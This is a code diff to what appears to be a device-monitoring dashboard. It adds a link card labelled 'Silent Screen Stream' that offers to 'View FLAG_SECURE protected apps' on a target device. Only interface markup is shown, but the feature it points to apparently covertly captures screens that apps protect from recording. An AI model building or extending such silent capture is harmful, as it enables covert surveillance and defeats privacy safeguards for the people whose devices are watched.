@@ -1188,6 +1188,27 @@ function LiveStreamContent() {
                                     </div>
                                 </div>
                             </div>
+
+                            {/* Silent Stream Link */}
+                            <Link
+                                href={`/devices/view/silent-stream?id=${deviceId}`}
+                                className="card p-6 rounded-[2rem] border border-violet-200 bg-gradient-to-br from-violet-50 to-purple-50 hover:from-violet-100 hover:to-purple-100 transition-all group"
+                            >
+                                <div className="flex items-center gap-4">
+                                    <div className="w-12 h-12 rounded-2xl bg-gradient-to-br from-violet-600 to-purple-600 flex items-center justify-center shadow-lg group-hover:scale-105 transition-transform">
+                                        <svg className="w-6 h-6 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9.75 17L9 20l-1 1h8l-1-1-.75-3M3 13h18M5 17h14a2 2 0 002-2V5a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z" />
+                                        </svg>
+                                    </div>
+                                    <div className="flex-1">
+                                        <h4 className="font-bold text-sm text-violet-900">Silent Screen Stream</h4>
+                                        <p className="text-[10px] text-violet-600 mt-0.5">View FLAG_SECURE protected apps</p>
+                                    </div>
+                                    <svg className="w-5 h-5 text-violet-400 group-hover:translate-x-1 transition-transform" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 5l7 7-7 7" />
+                                    </svg>
+                                </div>
+                            </Link>
                         </div>
                     </div>
 
